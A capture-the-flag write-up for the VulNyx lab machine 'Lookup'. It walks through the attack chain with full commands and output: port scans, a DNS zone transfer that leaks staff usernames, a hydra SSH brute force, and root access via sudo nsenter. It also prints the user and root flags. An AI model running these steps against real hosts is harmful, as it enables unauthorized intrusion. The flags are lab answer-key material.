---
title: "Lookup"
date: 2026-10-29
platform: VulNyx
difficulty: easy
locked: false
tags: [linux, dns]
---

## Reconnaissance

As always we inspect which are the open ports
```bash
sudo nmap -p- --min-rate 5000 -Pn -n -sS 192.168.1.36 -oG content/allPorts

Starting Nmap 7.993 ( https://nmap.org ) at 2026-10-29 21:44 +0100
Nmap scan report for 192.168.1.36
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 00:0C:29:40:3C:9F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

Then we inspect which are the versions and if the scripts of `nmap` are able to show us something interesting
```bash
nmap -p22,53,80 -sVC silvertech.nyx -Pn -oN content/target

Starting Nmap 7.993 ( https://nmap.org ) at 2026-10-29 21:04 +0100
Nmap scan report for silvertech.nyx (192.168.1.36)
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid: 
|   bind.version: 
|_    not currently available
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Under Construction
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.34 seconds
```

Accesing the page we aren't able to find nothig useful so we will try to find something using a reverse lookup
```bash
dig -x 192.168.1.36 @192.168.1.36

; <<>> DiG 9.20.30 <<>> -x 192.168.1.36 @192.168.1.36
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49534
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 72dbcbe819185fccecfb8b746ae3a6a18974fcedf97f5dcc (good)
;; QUESTION SECTION:
;36.1.168.192.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
36.1.168.192.in-addr.arpa. 86400 IN	PTR	ns1.silvertech.nyx.

;; AUTHORITY SECTION:
1.168.192.in-addr.arpa.	86400	IN	NS	ns1.silvertech.nyx.

;; ADDITIONAL SECTION:
ns1.silvertech.nyx.	86400	IN	A	192.168.1.36

;; Query time: 0 msec
;; SERVER: 192.168.1.36#53(192.168.1.36) (UDP)
;; WHEN: Thu Oct 29 21:03:45 CET 2026
;; MSG SIZE  rcvd: 144
```

The we will add it to hour hosts
```bash
echo '192.168.1.36 silvertech.nyx' | sudo tee -a /etc/hosts
```

## Explotation

As the web page is a blank webpage we will try to find a DNS Zone Transfer attack using the AXFR(Full Zone Tranfer) request.
```bash
dig axfr silvertech.nyx @silvertech.nyx 

; <<>> DiG 9.20.30 <<>> axfr silvertech.nyx @silvertech.nyx
; (1 server found)
;; global options: +cmd
silvertech.nyx.		86400	IN	SOA	ns1.silvertech.nyx. admin.silvertech.nyx. 1 3600 1800 604800 86400
silvertech.nyx.		86400	IN	NS	ns1.silvertech.nyx.
ceo.silvertech.nyx.	86400	IN	TXT	"a.miller@silvertech.nyx"
finance.silvertech.nyx.	86400	IN	TXT	"b.clark@silvertech.nyx"
hr.silvertech.nyx.	86400	IN	TXT	"m.bailey@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"p.logan@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"j.carter@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"r.turner@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"s.hughes@silvertech.nyx"
ns1.silvertech.nyx.	86400	IN	A	192.168.1.36
support.silvertech.nyx.	86400	IN	TXT	"p.hollen@silvertech.nyx"
www.silvertech.nyx.	86400	IN	A	192.168.1.36
silvertech.nyx.		86400	IN	SOA	ns1.silvertech.nyx. admin.silvertech.nyx. 1 3600 1800 604800 86400
;; Query time: 0 msec
;; SERVER: 192.168.1.36#53(silvertech.nyx) (TCP)
;; WHEN: Thu Oct 29 21:06:21 CET 2026
;; XFR size: 13 records (messages 1, bytes 515)
```

now we will save the users as they can be used for the ssh.
```bash
dig axfr silvertech.nyx @silvertech.nyx +short | grep '"' | tr -d '"' | awk -F '@' '{print $1}' > content/users
```

Let's use `hydra` to do a bruteforce attack
```bash
hydra -L content/users -P content/users silvertech.nyx ssh -u

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-29 21:34:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:8/p:8), ~4 tries per task
[DATA] attacking ssh://silvertech.nyx:22/
[22][ssh] host: silvertech.nyx   login: m.bailey   password: b.clark
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-29 21:34:54
```

## Privilege escalation

### M.bailey

Using the credentials gathered with `hydra` we are able to connect via SSH.
```bash
sshpass -p 'b.clark' ssh m.bailey@silvertech.nyx

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux lookup 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
m.bailey@lookup:~$ id
uid=1000(m.bailey) gid=1000(m.bailey) grupos=1000(m.bailey)
```

Now extract the flag
```bash
m.bailey@lookup:~$ export TERM=xterm
m.bailey@lookup:~$ ls
user.txt
m.bailey@lookup:~$ cat user.txt 
523b7bc4fec097ffa533f66a1f830936
```

### Root

Inspecting what we can execute with `sudo` we found a binary file.
```bash
m.bailey@lookup:~$ sudo -l
Matching Defaults entries for m.bailey on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User m.bailey may run the following commands on lookup:
    (root) NOPASSWD: /usr/bin/nsenter

m.bailey@lookup:~$ file /usr/bin/nsenter
/usr/bin/nsenter: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9abd3e4a57d0de539db7a460ef2bf1758aa70b4e, stripped
```

Checking what that program does we are able to see that we can execute programs with root permisions so we will execute a shell.
```bash
m.bailey@lookup:~$ nsenter --help

Modo de empleo:
 nsenter [opciones] [<programa> [<argumento>...]]

Ejecuta un programa con espacios de nombres de otros procesos.

Opciones:
 -a, --all              introduce todos los espacios de nombres
 -t, --target <pid>     proceso del que obtener los espacios de nombres
 -m, --mount[=<fichero>] introduce el espacio de nombres del montaje
 -u, --uts[=<fichero>]  introduce el espacio de nombres UTS (nombre de máquina, etc.)
 -i, --ipc[=<fichero>]  introduce el espacio de nombres del System V IPC
 -n, --net[=<fichero>]  introduce el espacio de nombres de red
 -p, --pid[=<fichero>]  introduce el espacio de nombres de pid
 -C, --cgroup[=<fichero>] introduce el espacio de nombres del cgroup
 -U, --user[=<fichero>] introduce el espacio de nombres de usuario
 -S, --setuid <uid>     establece el uid en el espacio de nombres introducido
 -G, --setgid <gid>     establece el gid en el espacio de nombres introducido
     --preserve-credentials no toca uids ni gids
 -r, --root[=<dir>]     establece el directorio raíz
 -w, --wd[=<dir>]       establece el directorio de trabajo
 -F, --no-fork          no crea otro proceso antes de ejecutar <programa>
 -Z, --follow-context   establece contexto SELinux conforme a --target PID

 -h, --help             muestra esta ayuda
 -V, --version          muestra la versión

Para más detalles véase nsenter(1).

m.bailey@lookup:~$ sudo nsenter /bin/bash
root@lookup:/home/m.bailey#
```

now we only need to gather the root flag
```bash
root@lookup:/home/m.bailey# cat /root/root.txt 
d38cf53dd5e7f99c695bd4b0fdbe3985
```
